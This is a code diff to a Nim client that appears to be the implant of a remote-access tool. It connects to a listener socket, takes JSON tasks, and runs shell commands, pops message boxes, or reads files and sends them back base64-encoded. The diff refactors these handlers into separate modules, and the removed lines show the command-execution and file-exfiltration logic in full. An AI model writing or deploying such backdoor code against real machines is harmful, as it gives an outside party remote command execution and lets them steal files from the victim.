@@ -1,6 +1,8 @@
-import net, strformat, strutils, osproc, os, base64, json
+import net, osproc, os, base64, json
 
 import modules, communication
+
+import ../commands/[shell, msgbox, download]
 
 let client: Socket = newSocket()
 client.connect("127.0.0.1", Port(1234))
@@ -25,19 +27,13 @@ proc receiveCommands(client: Socket) =
         else:
             let jsonNode = parseJson(task)
             case jsonNode["task"].getStr():
-            of "shell":
+            of "shell": 
                 let toExec = jsonNode["shellCmd"].getStr()
-                try:
-                    let (output, _) = execCmdEx(toExec, workingDir = getCurrentDir())
-                    client.sendOutput("CMD", output)
-                except OSError:
-                    client.sendOutput("CMD", getCurrentExceptionMsg())
+                shell.executeTask(client, toExec)
             of "msgbox":
-                discard msgbox(jsonNode["title"].getStr(), jsonNode["caption"].getStr())
+                msgbox.executeTask(client, jsonNode["title"].getStr(), jsonNode["caption"].getStr())
             of "download":
-                let path = jsonNode["path"].getStr()
-                let contents: string = readFile(path)
-                client.sendFile(path, encode(contents))
+                download.executeTask(client, jsonNode["path"].getStr())
 
 receiveCommands(client)
   
